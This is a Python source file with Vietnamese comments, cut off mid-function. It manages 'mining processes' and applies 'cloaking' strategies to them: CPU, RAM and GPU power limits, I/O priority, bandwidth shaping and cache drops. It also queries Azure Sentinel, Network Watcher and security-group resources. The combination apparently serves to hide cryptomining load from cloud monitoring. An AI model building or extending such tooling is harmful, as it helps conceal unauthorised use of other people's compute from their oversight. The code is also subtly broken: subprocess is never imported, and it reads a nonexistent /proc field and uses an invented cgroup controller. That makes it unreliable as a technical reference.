# resource_manager.py

import os
import logging
import psutil
import pynvml
import traceback
from time import sleep, time
from datetime import datetime, timedelta, timezone
from pathlib import Path
from queue import PriorityQueue, Empty, Queue
from threading import Event, Thread, Lock
from typing import List, Any, Dict, Optional
from readerwriterlock import rwlock
from itertools import count
from concurrent.futures import ThreadPoolExecutor, as_completed

# Import các module phụ trợ từ dự án
from .base_manager import BaseManager
from .utils import MiningProcess, GPUManager
from .cloak_strategies import CloakStrategy, CloakStrategyFactory
from .cgroup_manager import CgroupManager  # Import CgroupManager

# CHỈ GIỮ LẠI các import từ azure_clients TRỪ AzureTrafficAnalyticsClient
from .azure_clients import (
    AzureSentinelClient,
    AzureLogAnalyticsClient,
    AzureNetworkWatcherClient,
    # AzureTrafficAnalyticsClient đã được loại bỏ
    AzureAnomalyDetectorClient
    # AzureOpenAIClient đã được loại bỏ
)

from .auxiliary_modules import temperature_monitor
from .auxiliary_modules.power_management import (
    PowerManager,
    get_cpu_power,
    get_gpu_power,
    set_gpu_usage,
    shutdown_power_management
)




class SharedResourceManager:
    """
    Lớp cung cấp các hàm điều chỉnh tài nguyên (CPU, RAM, GPU, Disk, Network...).
    """
    def __init__(self, config: Dict[str, Any], logger: logging.Logger, cgroup_manager: CgroupManager):
        self.config = config
        self.logger = logger
        self.cgroup_manager = cgroup_manager
        self.original_resource_limits = {}
        self.gpu_manager = GPUManager()
        self.power_manager = PowerManager()

    def is_gpu_initialized(self) -> bool:
        """
        Kiểm tra xem GPU đã được khởi tạo hay chưa.
        """
        self.logger.debug(
            f"Checking GPU initialization: {self.gpu_manager.gpu_initialized}"
        )
        return self.gpu_manager.gpu_initialized

    def shutdown_nvml(self):
        """
        Đóng NVML khi không cần thiết.
        """
        self.gpu_manager.shutdown_nvml()  # Sử dụng GPUManager để shutdown NVML

    def apply_cloak_strategy(self, strategy_name: str, process: MiningProcess, cgroups: Dict[str, str]):
        """
        Áp dụng một chiến lược cloaking cho tiến trình đã cho.

        Args:
            strategy_name (str): Tên của chiến lược cloaking (ví dụ: 'cpu', 'gpu').
            process (MiningProcess): Đối tượng tiến trình khai thác.
            cgroups (Dict[str, str]): Dictionary chứa tên các cgroup cho các controller.
        """
        try:
            pid = process.pid
            name = process.name

            # Lưu trữ giới hạn tài nguyên ban đầu nếu chưa được lưu
            if pid not in self.original_resource_limits:
                self.original_resource_limits[pid] = {}

                if strategy_name == 'cpu':
                    current_quota = self.cgroup_manager.get_cgroup_parameter(
                        cgroups['cpu'], 'cpu.cfs_quota_us', 'cpu'
                    )
                    current_threads = self.cgroup_manager.get_cgroup_parameter(
                        cgroups['cpu'], 'cpuset.cpus', 'cpuset'
                    )
                    self.original_resource_limits[pid]['cpu_cloak'] = {
                        'cgroup': cgroups['cpu'],
                        'cpu_quota_us': current_quota,
                        'cpu_threads': current_threads
                    }

                elif strategy_name == 'ram':
                    current_ram = self.cgroup_manager.get_cgroup_parameter(
                        cgroups['ram'], 'memory.limit_in_bytes', 'memory'
                    )
                    self.original_resource_limits[pid]['ram_cloak'] = {
                        'ram_allocation_mb': int(current_ram) // (1024 * 1024)
                    }

                elif strategy_name == 'gpu':
                    current_power = self.gpu_manager.get_gpu_power_limit(pid)
                    self.original_resource_limits[pid]['gpu_cloak'] = {
                        'gpu_power_limit': current_power
                    }

                elif strategy_name == 'ionice':
                    # Giả sử có phương thức để lấy ionice class hiện tại
                    current_ionice = self.get_current_ionice_class(pid)
                    self.original_resource_limits[pid]['ionice_cloak'] = {
                        'ionice_class': current_ionice
                    }

                elif strategy_name == 'network':
                    current_bandwidth = self.cgroup_manager.get_cgroup_parameter(
                        cgroups['network'], 'net_cls.classid', 'net_cls'
                    )
                    self.original_resource_limits[pid]['network_cloak'] = {
                        'network_bandwidth_limit_mbps': float(current_bandwidth)
                    }

                elif strategy_name == 'cache':
                    current_cache_limit = self.cgroup_manager.get_cgroup_parameter(
                        cgroups['cache'], 'cache.max', 'cache'
                    )
                    self.original_resource_limits[pid]['cache_cloak'] = {
                        'cache_limit_percent': float(current_cache_limit)
                    }

            self.logger.debug(f"Tạo strategy '{strategy_name}' cho {name} (PID={pid})")
            strategy = CloakStrategyFactory.create_strategy(
                strategy_name,
                self.config,
                self.logger,
                self.cgroup_manager,          
                self.is_gpu_initialized()    
            )

            if not strategy:
                self.logger.error(f"Failed to create strategy '{strategy_name}'. Strategy is None.")
                return
            if not callable(getattr(strategy, 'apply', None)):
                self.logger.error(f"Invalid strategy: {strategy.__class__.__name__} does not implement a callable 'apply' method.")
                return

            self.logger.info(f"Bắt đầu áp dụng chiến lược '{strategy_name}' cho {name} (PID={pid})")
            strategy.apply(process, cgroups)  # Các điều chỉnh tài nguyên được thực hiện trực tiếp bởi strategy
            self.logger.info(f"Hoàn thành áp dụng chiến lược '{strategy_name}' cho {name} (PID={pid}).")

        except Exception as e:
            self.logger.error(
                f"Lỗi không xác định khi áp dụng cloaking '{strategy_name}' cho {name} (PID={pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    def restore_resources(self, process: MiningProcess):
        """
        Khôi phục lại các tài nguyên ban đầu cho tiến trình đã cho bằng cách xóa các cgroup liên quan và thiết lập lại các giới hạn tài nguyên.

        Args:
            process (MiningProcess): Đối tượng tiến trình khai thác.
        """
        try:
            pid = process.pid
            name = process.name
            orig_limits = self.original_resource_limits.get(pid)
            if not orig_limits:
                self.logger.warning(
                    f"Không thấy original_limits cho {name} (PID={pid})."
                )
                return

            # Khôi phục các giới hạn tài nguyên từ original_resource_limits
            # 1. CPU Cloak
            if 'cpu_cloak' in orig_limits:
                cpu_info = orig_limits['cpu_cloak']
                self.adjust_cpu_threads(pid, cpu_info['cpu_threads'], name)
                self.cgroup_manager.delete_cgroup(cpu_info['cgroup'], controllers='cpu')
                self.cgroup_manager.delete_cgroup(f"cpuset_cloak_{pid}", controllers='cpuset')
                self.logger.info(f"Đã khôi phục CPU threads và xóa cgroup CPU cho {name} (PID={pid}).")

            # 2. RAM Cloak
            if 'ram_cloak' in orig_limits:
                ram_info = orig_limits['ram_cloak']
                self.adjust_ram_allocation(pid, ram_info['ram_allocation_mb'], name)
                self.cgroup_manager.delete_cgroup(f"ram_cloak_{pid}", controllers='memory')
                self.logger.info(f"Đã khôi phục RAM allocation và xóa cgroup RAM cho {name} (PID={pid}).")

            # 3. GPU Cloak
            if 'gpu_cloak' in orig_limits:
                gpu_info = orig_limits['gpu_cloak']
                self.adjust_gpu_power_limit(pid, gpu_info['gpu_power_limit'], name)
                self.cgroup_manager.delete_cgroup(f"gpu_cloak_{pid}", controllers='gpu')
                self.logger.info(f"Đã khôi phục GPU power limit và xóa cgroup GPU cho {name} (PID={pid}).")

            # 4. Ionice Cloak
            if 'ionice_cloak' in orig_limits:
                ionice_info = orig_limits['ionice_cloak']
                self.adjust_disk_io_priority(pid, ionice_info['ionice_class'], name)
                self.cgroup_manager.delete_cgroup(f"ionice_cloak_{pid}", controllers='blkio')
                self.logger.info(f"Đã khôi phục Ionice class và xóa cgroup Disk I/O cho {name} (PID={pid}).")

            # 5. Network Cloak
            if 'network_cloak' in orig_limits:
                network_info = orig_limits['network_cloak']
                self.adjust_network_bandwidth(process, network_info['network_bandwidth_limit_mbps'])
                self.cgroup_manager.delete_cgroup(f"network_cloak_{pid}", controllers='net_cls,net_prio')
                self.logger.info(f"Đã khôi phục Network bandwidth và xóa cgroup Network cho {name} (PID={pid}).")

            # 6. Cache Cloak
            if 'cache_cloak' in orig_limits:
                cache_info = orig_limits['cache_cloak']
                self.adjust_cache_limit(pid, cache_info['cache_limit_percent'], name)
                self.cgroup_manager.delete_cgroup(f"cache_cloak_{pid}", controllers='cache')
                self.logger.info(f"Đã khôi phục Cache limit và xóa cgroup Cache cho {name} (PID={pid}).")

            # Xóa các cgroup liên quan đã được liệt kê trước đó nếu vẫn còn tồn tại
            cgroups_to_delete = [
                f"cpu_cloak_{pid}",
                f"gpu_cloak_{pid}",
                f"network_cloak_{pid}",
                f"disk_io_cloak_{pid}",
                f"cache_cloak_{pid}",
                f"cpuset_cloak_{pid}",
                f"ionice_cloak_{pid}"
            ]

            for cgroup in cgroups_to_delete:
                controllers = ''
                if 'cpu_cloak' in cgroup or 'cpu' in cgroup:
                    controllers = 'cpu'
                elif 'gpu_cloak' in cgroup or 'gpu' in cgroup:
                    controllers = 'gpu'
                elif 'network_cloak' in cgroup or 'network' in cgroup:
                    controllers = 'net_cls,net_prio'
                elif 'disk_io_cloak' in cgroup or 'ionice' in cgroup:
                    controllers = 'blkio'
                elif 'cache_cloak' in cgroup or 'cache' in cgroup:
                    controllers = 'cache'
                elif 'cpuset_cloak' in cgroup or 'cpuset' in cgroup:
                    controllers = 'cpuset'
                else:
                    self.logger.warning(f"Không xác định controller cho cgroup '{cgroup}'.")
                    continue

                # Xóa cgroup nếu nó vẫn tồn tại
                self.cgroup_manager.delete_cgroup(cgroup, controllers=controllers)
                self.logger.info(f"Đã xóa cgroup '{cgroup}' cho tiến trình {name} (PID={pid}).")

            # Xóa trạng thái ban đầu
            del self.original_resource_limits[pid]
            self.logger.info(
                f"Khôi phục xong tài nguyên cho {name} (PID={pid})."
            )
        except Exception as e:
            self.logger.error(
                f"Lỗi restore_resources cho {process.name} (PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise



    def adjust_gpu_power_limit(self, pid: int, power_limit: int, process_name: str, unit: str = 'W') -> bool:
        """
        Điều chỉnh giới hạn power của GPU cho tiến trình.

        Args:
            pid (int): PID của tiến trình.
            power_limit (int): Giới hạn power cần đặt.
            process_name (str): Tên của tiến trình.
            unit (str, optional): Đơn vị của power_limit ('W' hoặc 'mW'). Defaults to 'W'.

        Returns:
            bool: True nếu điều chỉnh thành công, ngược lại False.
        """
        self.logger.debug(f"Adjusting GPU power limit for PID={pid}, power_limit={power_limit}, unit={unit}")
        if not self.gpu_manager.gpu_initialized:
            self.logger.error("GPUManager chưa được khởi tạo. Không thể điều chỉnh GPU power limit.")
            return False

        try:
            gpu_index = 0  # Giả sử sử dụng GPU đầu tiên. Có thể mở rộng để chọn GPU dựa trên PID hoặc logic khác.
            handle = pynvml.nvmlDeviceGetHandleByIndex(gpu_index)

            if unit.lower() == 'mw':
                power_limit_mw = power_limit
            elif unit.lower() == 'w':
                power_limit_mw = power_limit * 1000
            else:
                raise ValueError(f"Đơn vị không hợp lệ: {unit}. Chỉ hỗ trợ 'W' và 'mW'.")

            self.logger.debug(f"Converted power_limit to mW: {power_limit_mw} mW")
            min_limit, max_limit = pynvml.nvmlDeviceGetPowerManagementLimitConstraints(handle)
            self.logger.debug(f"GPU power limit constraints: min={min_limit} mW, max={max_limit} mW")

            if not (min_limit <= power_limit_mw <= max_limit):
                raise ValueError(
                    f"Power limit {power_limit}{unit} không hợp lệ. "
                    f"Khoảng hợp lệ: {min_limit // 1000}W - {max_limit // 1000}W."
                )

            # Sử dụng CgroupManager để thiết lập power limit nếu có phương thức phù hợp
            # Tuy nhiên, trong CgroupManager hiện tại chưa hỗ trợ power limit, nên vẫn sử dụng GPUManager trực tiếp
            # Đảm bảo rằng GPUManager đã được tích hợp đúng cách

            self.gpu_manager.set_gpu_power_limit(gpu_index, power_limit_mw // 1000)  # Chuyển từ mW sang W
            self.logger.info(
                f"Set GPU power limit={power_limit}{unit} cho {process_name} (PID: {pid})."
            )
            return True
        except pynvml.NVMLError as e:
            self.logger.error(
                f"Lỗi NVML khi set GPU power limit cho {process_name} (PID={pid}): {e}. "
                f"Power limit yêu cầu: {power_limit}{unit}."
            )
        except ValueError as ve:
            self.logger.error(f"Lỗi giá trị power limit: {ve}")
        except Exception as e:
            self.logger.error(
                f"Lỗi không xác định khi set GPU power limit cho {process_name} (PID={pid}): {e}."
            )

        return False

    def adjust_disk_io_priority(self, pid: int, ionice_class: int, process_name: str):
        """
        Điều chỉnh độ ưu tiên Disk I/O cho tiến trình bằng ionice.

        Args:
            pid (int): PID của tiến trình.
            ionice_class (int): Lớp ionice (1: realtime, 2: best-effort, 3: idle).
            process_name (str): Tên của tiến trình.
        """
        try:
            # Sử dụng CgroupManager để thao tác với cgroup disk_io nếu cần
            # Tuy nhiên, ionice là một công cụ ngoài cgroup, nên vẫn sử dụng subprocess
            subprocess.run(['ionice', '-c', str(ionice_class), '-p', str(pid)], check=True)
            self.logger.info(
                f"Set ionice class={ionice_class} cho tiến trình {process_name} (PID={pid})."
            )
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Lỗi chạy ionice: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi adjust_disk_io_priority cho {process_name} (PID={pid}): {e}\n{traceback.format_exc()}"
            )

    def drop_caches(self):
        """
        Drop caches của hệ thống để giảm sử dụng cache.
        """
        try:
            with open('/proc/sys/vm/drop_caches', 'w') as f:
                f.write('3\n')
            self.logger.info("Đã drop caches.")
        except Exception as e:
            self.logger.error(
                f"Lỗi drop_caches: {e}\n{traceback.format_exc()}"
            )

    def adjust_cache_limit(self, pid: int, cache_limit_percent: float, process_name: str):
        """
        Điều chỉnh giới hạn cache cho tiến trình.

        Args:
            pid (int): PID của tiến trình.
            cache_limit_percent (float): Giới hạn cache theo phần trăm.
            process_name (str): Tên của tiến trình.
        """
        try:
            # Giả sử sử dụng cgroups để giới hạn cache (cần thiết lập cgroups phù hợp trước)
            # Đây chỉ là một ví dụ, bạn cần điều chỉnh phù hợp với hệ thống của mình
            # Ví dụ: giới hạn cache bằng cách ghi vào file cgroup
            cgroup_path = f"/sys/fs/cgroup/cache/{pid}"
            if not Path(cgroup_path).exists():
                self.logger.warning(f"Cgroup cho PID={pid} không tồn tại. Bỏ qua điều chỉnh cache.")
                return

            # Giả sử 'cache.max' là file cấu hình để giới hạn cache
            cache_limit_bytes = int(cache_limit_percent / 100 * self.get_total_cache())
            self.cgroup_manager.set_cgroup_parameter(
                'cache_cgroup', 'cache.max', str(cache_limit_bytes), controllers='cache'
            )
            
            self.logger.info(
                f"Đã điều chỉnh giới hạn cache thành {cache_limit_percent}% ({cache_limit_bytes} bytes) cho tiến trình {process_name} (PID: {pid})."
            )
        except FileNotFoundError:
            self.logger.error(f"Không tìm thấy cgroup cache cho PID={pid}.")
        except PermissionError:
            self.logger.error(f"Không đủ quyền để điều chỉnh cache cho PID={pid}.")
        except Exception as e:
            self.logger.error(
                f"Lỗi adjust_cache_limit cho {process_name} (PID={pid}): {e}\n{traceback.format_exc()}"
            )

    def get_total_cache(self) -> int:
        """
        Lấy tổng lượng cache hiện có trên hệ thống.

        Returns:
            int: Tổng cache tính bằng bytes.
        """
        # Ví dụ: giả sử tổng cache là 8GB
        return 8 * 1024 * 1024 * 1024  # 8GB in bytes

    def get_process_cache_usage(self, pid: int) -> float:
        """
        Lấy usage cache của tiến trình.

        Args:
            pid (int): PID của tiến trình.

        Returns:
            float: Cache usage phần trăm.
        """
        try:
            # Cách lấy cache usage có thể khác nhau tùy vào hệ điều hành
            # Dưới đây là một ví dụ giả định sử dụng /proc/[pid]/status (chỉ dành cho Linux)
            with open(f"/proc/{pid}/status", 'r') as f:
                for line in f:
                    if line.startswith("VmCache:"):
                        cache_kb = int(line.split()[1])
                        total_mem_kb = psutil.virtual_memory().total / 1024
                        cache_percent = (cache_kb / total_mem_kb) * 100
                        return cache_percent
            self.logger.warning(f"Không tìm thấy VmCache cho PID={pid}.")
            return 0.0
        except FileNotFoundError:
            self.logger.error(f"Không tìm thấy tiến trình với PID={pid} khi lấy cache.")
            return 0.0
        except Exception as e:
            self.logger.error(f"Lỗi get_process_cache_usage cho PID={pid}: {e}\n{traceback.format_exc()}")
            return 0.0

    def apply_network_cloaking(self, interface: str, bandwidth_limit: float, process: MiningProcess):
        """
        Áp dụng cloaking mạng cho tiến trình bằng cách cấu hình giao diện mạng.

        Args:
            interface (str): Tên giao diện mạng.
            bandwidth_limit (float): Giới hạn băng thông (Mbps).
            process (MiningProcess): Đối tượng tiến trình khai thác.
        """
        try:
            self.configure_network_interface(interface, bandwidth_limit)
        except Exception as e:
            self.logger.error(
                f"Lỗi network cloaking cho {process.name} (PID={process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    def configure_network_interface(self, interface: str, bandwidth_limit: float):
        """
        Cấu hình giao diện mạng để giới hạn băng thông.

        Args:
            interface (str): Tên giao diện mạng.
            bandwidth_limit (float): Giới hạn băng thông (Mbps).
        """
        try:
            # Sử dụng `tc` để giới hạn băng thông mạng
            # Giả sử `tc` đã được cài đặt và cấu hình đúng cách trên hệ thống
            # Reset các qdisc hiện tại
            subprocess.run(['tc', 'qdisc', 'del', 'dev', interface, 'root'], check=False, stderr=subprocess.DEVNULL)
            # Thiết lập limit băng thông
            subprocess.run([
                'tc', 'qdisc', 'add', 'dev', interface, 'root', 'handle', '1:0',
                'htb', 'default', '30'
            ], check=True)
            subprocess.run([
                'tc', 'class', 'add', 'dev', interface, 'parent', '1:0',
                'classid', '1:1', 'htb', 'rate', f'{bandwidth_limit}Mbps'
            ], check=True)
            self.logger.info(
                f"Đã cấu hình giới hạn băng thông mạng cho giao diện {interface} thành {bandwidth_limit} Mbps."
            )
        except subprocess.CalledProcessError as e:
            self.logger.error(f"Lỗi cấu hình network interface {interface} với tc: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi configure_network_interface cho {interface}: {e}\n{traceback.format_exc()}"
            )

class ResourceManager(BaseManager):
    """
    Lớp quản lý tài nguyên hệ thống, chịu trách nhiệm giám sát và điều chỉnh tài nguyên cho các tiến trình khai thác.
    Đây là một Singleton để đảm bảo chỉ có một instance của ResourceManager tồn tại.
    """
    _instance = None
    _instance_lock = Lock()

    def __new__(cls, *args, **kwargs):
        with cls._instance_lock:
            if cls._instance is None:
                cls._instance = super().__new__(cls)
        return cls._instance

    def __init__(self, config: Dict[str, Any], logger: logging.Logger):
        super().__init__(config, logger)
        if getattr(self, '_initialized', False):
            return
        self._initialized = True

        self.config = config
        self.logger = logger

        self.stop_event = Event()
        self.resource_lock = rwlock.RWLockFair()
        self.cloaking_request_queue = Queue()
        self.resource_adjustment_queue = PriorityQueue()
        self.processed_tasks = set()

        self.mining_processes = []
        self.mining_processes_lock = rwlock.RWLockFair()
        self._counter = count()

        # Khởi tạo các client Azure (đã bỏ AzureSecurityCenterClient và AzureTrafficAnalyticsClient)
        self.initialize_azure_clients()
        self.discover_azure_resources()

        # Khởi tạo CgroupManager
        self.cgroup_manager = CgroupManager(logger)

        # Khởi tạo SharedResourceManager
        self.shared_resource_manager = SharedResourceManager(config, logger, self.cgroup_manager)

        # Sử dụng ThreadPoolExecutor để quản lý các thread
        self.executor = ThreadPoolExecutor(max_workers=5)
        self.initialize_tasks()

    def initialize_tasks(self):
        """
        Khởi tạo các tác vụ bằng ThreadPoolExecutor.
        """
        # Submit các thread vào executor
        self.monitor_future = self.executor.submit(self.monitor_and_adjust)
        self.cloaking_future = self.executor.submit(self.process_cloaking_requests)
        self.adjustment_future = self.executor.submit(self.process_resource_adjustments)

    def start(self):
        """
        Bắt đầu ResourceManager, bao gồm việc khám phá tiến trình khai thác và khởi động các thread.
        """
        self.logger.info("Bắt đầu ResourceManager...")
        self.discover_mining_processes()
        self.logger.info("ResourceManager đã khởi động xong.")

    def stop(self):
        """
        Dừng ResourceManager, bao gồm việc dừng các thread và tắt power management.
        """
        self.logger.info("Dừng ResourceManager...")
        self.stop_event.set()
        self.executor.shutdown(wait=True)
        self.shared_resource_manager.shutdown_nvml()
        self.shutdown_power_management()  # Gọi hàm shutdown_power_management
        self.cgroup_manager.delete_cgroup('priority_cpu', controllers='cpu')  # Xóa cgroup priority_cpu nếu tồn tại
        self.logger.info("ResourceManager đã dừng.")

    def initialize_azure_clients(self):
        """
        Khởi tạo các client Azure cần thiết.
        """
        self.azure_sentinel_client = AzureSentinelClient(self.logger)
        self.azure_log_analytics_client = AzureLogAnalyticsClient(self.logger)
        self.azure_network_watcher_client = AzureNetworkWatcherClient(self.logger)
        self.azure_anomaly_detector_client = AzureAnomalyDetectorClient(self.logger, self.config)
        # ĐÃ BỎ self.azure_openai_client
        # self.azure_openai_client = AzureOpenAIClient(self.logger, self.config)

    def discover_azure_resources(self):
        """
        Khám phá các tài nguyên Azure cần thiết.
        """
        try:
            self.network_watchers = self.azure_network_watcher_client.discover_resources(
                'Microsoft.Network/networkWatchers'
            )
            self.logger.info(f"Khám phá {len(self.network_watchers)} Network Watchers.")

            self.nsgs = self.azure_network_watcher_client.discover_resources(
                'Microsoft.Network/networkSecurityGroups'
            )
            self.logger.info(f"Khám phá {len(self.nsgs)} NSGs.")

            # Đã loại bỏ việc khám phá Traffic Analytics Workspaces
            # self.traffic_analytics_workspaces = self.azure_traffic_analytics_client.get_traffic_workspace_ids()
            # self.logger.info(
            #     f"Khám phá {len(self.traffic_analytics_workspaces)} Traffic Analytics Workspaces."
            # )
            self.logger.info("Khám phá Traffic Analytics Workspaces đã bị loại bỏ.")

        except Exception as e:
            self.logger.error(f"Lỗi khám phá Azure: {e}\n{traceback.format_exc()}")

    def discover_mining_processes(self):
        """
        Khám phá các tiến trình khai thác đang chạy trên hệ thống dựa trên cấu hình.
        """
        try:
            cpu_name = self.config['processes'].get('CPU', '').lower()
            gpu_name = self.config['processes'].get('GPU', '').lower()

            with self.mining_processes_lock.gen_wlock(timeout=5) as resource_lock_acquired:
                if not resource_lock_acquired:
                    self.logger.error("Timeout khi acquire mining_processes_lock trong discover_mining_processes.")
                    return

                self.mining_processes.clear()
                for proc in psutil.process_iter(['pid', 'name']):
                    pname = proc.info['name'].lower()
                    if cpu_name in pname or gpu_name in pname:
                        prio = self.get_process_priority(proc.info['name'])
                        net_if = self.config.get('network_interface', 'eth0')
                        mining_proc = MiningProcess(
                            proc.info['pid'], proc.info['name'], prio, net_if, self.logger
                        )
                        self.mining_processes.append(mining_proc)
                self.logger.info(
                    f"Khám phá {len(self.mining_processes)} tiến trình khai thác."
                )
        except Exception as e:
            self.logger.error(f"Lỗi discover_mining_processes: {e}\n{traceback.format_exc()}")

    def get_process_priority(self, process_name: str) -> int:
        """
        Lấy độ ưu tiên của tiến trình dựa trên tên.

        Args:
            process_name (str): Tên của tiến trình.

        Returns:
            int: Độ ưu tiên của tiến trình.
        """
        priority_map = self.config.get('process_priority_map', {})
        pri_val = priority_map.get(process_name.lower(), 1)
        if isinstance(pri_val, dict) or not isinstance(pri_val, int):
            self.logger.warning(
                f"Priority cho tiến trình '{process_name}' không phải int => gán 1."
            )
            return 1
        return pri_val

    def monitor_and_adjust(self):
        """
        Thread để giám sát và điều chỉnh tài nguyên dựa trên các thông số như nhiệt độ và công suất.
        """
        mon_params = self.config.get("monitoring_parameters", {})
        temp_intv = mon_params.get("temperature_monitoring_interval_seconds", 60)
        power_intv = mon_params.get("power_monitoring_interval_seconds", 60)

        while not self.stop_event.is_set():
            try:
                # 1) Cập nhật danh sách mining_processes
                self.discover_mining_processes()

                # 2) Phân bổ tài nguyên theo thứ tự ưu tiên
                self.allocate_resources_with_priority()

                # 3) Kiểm tra nhiệt độ CPU/GPU, nếu vượt ngưỡng thì enqueue cloak
                temp_lims = self.config.get("temperature_limits", {})
                cpu_max_temp = temp_lims.get("cpu_max_celsius", 75)
                gpu_max_temp = temp_lims.get("gpu_max_celsius", 85)

                for proc in self.mining_processes:
                    self.check_temperature_and_enqueue(proc, cpu_max_temp, gpu_max_temp)

                # 4) Kiểm tra công suất CPU/GPU, nếu vượt ngưỡng thì enqueue cloak
                power_limits = self.config.get("power_limits", {})
                per_dev_power = power_limits.get("per_device_power_watts", {})

                cpu_max_pwr = per_dev_power.get("cpu", 150)
                if not isinstance(cpu_max_pwr, (int, float)):
                    self.logger.warning(f"cpu_max_power invalid: {cpu_max_pwr}, default=150")
                    cpu_max_pwr = 150

                gpu_max_pwr = per_dev_power.get("gpu", 300)
                if not isinstance(gpu_max_pwr, (int, float)):
                    self.logger.warning(f"gpu_max_power invalid: {gpu_max_pwr}, default=300")
                    gpu_max_pwr = 300

                for proc in self.mining_processes:
                    self.check_power_and_enqueue(proc, cpu_max_pwr, gpu_max_pwr)

                # 5) Thu thập metrics (nếu vẫn cần để giám sát)
                metrics_data = self.collect_all_metrics()

                # Loại bỏ các phần liên quan đến OpenAI

            except Exception as e:
                self.logger.error(f"Lỗi monitor_and_adjust: {e}\n{traceback.format_exc()}")

            # 6) Nghỉ theo chu kỳ lớn nhất (mặc định 10 giây)
            sleep(max(temp_intv, power_intv))

    def check_temperature_and_enqueue(self, process: MiningProcess, cpu_max_temp: int, gpu_max_temp: int):
        """
        Kiểm tra nhiệt độ CPU và GPU của tiến trình và enqueue các điều chỉnh nếu cần.

        Args:
            process (MiningProcess): Đối tượng tiến trình khai thác.
            cpu_max_temp (int): Ngưỡng nhiệt độ CPU tối đa (°C).
            gpu_max_temp (int): Ngưỡng nhiệt độ GPU tối đa (°C).
        """
        try:
            cpu_temp = temperature_monitor.get_cpu_temperature(process.pid)
            gpu_temp = temperature_monitor.get_gpu_temperature(process.pid)

            adjustments = {}
            if cpu_temp is not None and cpu_temp > cpu_max_temp:
                self.logger.warning(
                    f"Nhiệt độ CPU {cpu_temp}°C > {cpu_max_temp}°C (PID={process.pid})."
                )
                adjustments['cpu_cloak'] = True
            if gpu_temp is not None and gpu_temp > gpu_max_temp:
                self.logger.warning(
                    f"Nhiệt độ GPU {gpu_temp}°C > {gpu_max_temp}°C (PID={process.pid})."
                )
                adjustments['gpu_cloak'] = True

            if adjustments:
                task = {
                    'type': 'monitoring',
                    'process': process,
                    'adjustments': adjustments
                }
                priority = 2
                count_val = next(self._counter)
                self.resource_adjustment_queue.put((priority, count_val, task))
        except Exception as e:
            self.logger.error(f"check_temperature_and_enqueue error: {e}\n{traceback.format_exc()}")

    def check_power_and_enqueue(self, process: MiningProcess, cpu_max_power: int, gpu_max_power: int):
        """
        Kiểm tra công suất CPU và GPU của tiến trình và enqueue các điều chỉnh nếu cần.

        Args:
            process (MiningProcess): Đối tượng tiến trình khai thác.
            cpu_max_power (int): Ngưỡng công suất CPU tối đa (W).
            gpu_max_power (int): Ngưỡng công suất GPU tối đa (W).
        """
        try:
            c_power = get_cpu_power(process.pid)
            g_power = get_gpu_power(process.pid) if self.shared_resource_manager.is_gpu_initialized() else 0.0

            adjustments = {}
            if c_power > cpu_max_power:
                self.logger.warning(
                    f"CPU power={c_power}W > {cpu_max_power}W (PID={process.pid})."
                )
                adjustments['cpu_cloak'] = True

            # Kiểm tra nếu g_power là list
            if isinstance(g_power, list):
                total_g_power = sum(g_power)
                self.logger.debug(f"Total GPU power for PID={process.pid}: {total_g_power}W")
                if total_g_power > gpu_max_power:
                    self.logger.warning(
                        f"Tổng GPU power={total_g_power}W > {gpu_max_power}W (PID={process.pid})."
                    )
                    adjustments['gpu_cloak'] = True
            else:
                if g_power > gpu_max_power:
                    self.logger.warning(
                        f"GPU power={g_power}W > {gpu_max_power}W (PID={process.pid})."
                    )
                    adjustments['gpu_cloak'] = True

            if adjustments:
                task = {
                    'type': 'monitoring',
                    'process': process,
                    'adjustments': adjustments
                }
                priority = 2
                count_val = next(self._counter)
                self.resource_adjustment_queue.put((priority, count_val, task))
        except Exception as e:
            self.logger.error(f"check_power_and_enqueue error: {e}\n{traceback.format_exc()}")

    def allocate_resources_with_priority(self):
        """
        Phân bổ tài nguyên cho các tiến trình khai thác theo thứ tự ưu tiên.
        """
        try:
            # Acquire locks theo thứ tự: resource_lock trước, mining_processes_lock sau
            with self.resource_lock.gen_wlock(timeout=5) as resource_lock_acquired:
                if not resource_lock_acquired:
                    self.logger.error("Timeout khi acquire resource_lock trong allocate_resources_with_priority.")
                    return

                with self.mining_processes_lock.gen_rlock(timeout=5) as mining_lock_acquired:
                    if not mining_lock_acquired:
                        self.logger.error("Timeout khi acquire mining_processes_lock trong allocate_resources_with_priority.")
                        return

                    # Sắp xếp các tiến trình theo độ ưu tiên giảm dần
                    sorted_procs = sorted(
                        self.mining_processes,
                        key=lambda x: x.priority,
                        reverse=True
                    )
                    
                    total_cores = psutil.cpu_count(logical=True)
                    allocated = 0
                    
                    for proc in sorted_procs:
                        if allocated >= total_cores:
                            self.logger.warning(
                                f"Không còn CPU core cho {proc.name} (PID: {proc.pid})."
                            )
                            continue
                        
                        # Giới hạn CPU sử dụng bằng cgroup
                        cpu_limit_ratio = min(proc.priority, total_cores - allocated) / total_cores
                        quota = int(cpu_limit_ratio * 100000)
                        self.logger.debug(f"Setting CPU limit for PID={proc.pid}: {cpu_limit_ratio*100:.2f}% ({quota}us)")

                        # Sử dụng CgroupManager để tạo và thiết lập cgroup CPU
                        cpu_cgroup = f"cpu_cloak_{proc.pid}"
                        self.cgroup_manager.create_cgroup(cpu_cgroup, controllers='cpu')
                        self.cgroup_manager.set_cgroup_parameter(
                            cpu_cgroup, 'cpu.cfs_quota_us', str(quota), controllers='cpu'
                        )
                        self.cgroup_manager.assign_process_to_cgroup(proc.pid, cpu_cgroup, controllers='cpu')
                        
                        # Enqueue cloaking strategy
                        task = {
                            'type': 'cloaking',
                            'process': proc,
                            'strategies': ['cpu']
                        }
                        self.resource_adjustment_queue.put((
                            3, 
                            next(self._counter),
                            task
                        ))
                        
                        allocated += proc.priority
        except Exception as e:
            self.logger.error(
                f"Lỗi allocate_resources_with_priority: {e}\n{traceback.format_exc()}"
            )

    def process_cloaking_requests(self):
        """
        Thread để xử lý các yêu cầu cloaking từ queue.
        """
        while not self.stop_event.is_set():
            try:
                process = self.cloaking_request_queue.get(timeout=1)
                adjustment_task = {
                    'type': 'cloaking',
                    'process': process,
                    'strategies': ['cpu', 'gpu', 'network', 'disk_io', 'cache']
                }
                priority = 1  # Yêu cầu cloaking có ưu tiên cao nhất
                count_val = next(self._counter)
                self.resource_adjustment_queue.put((priority, count_val, adjustment_task))
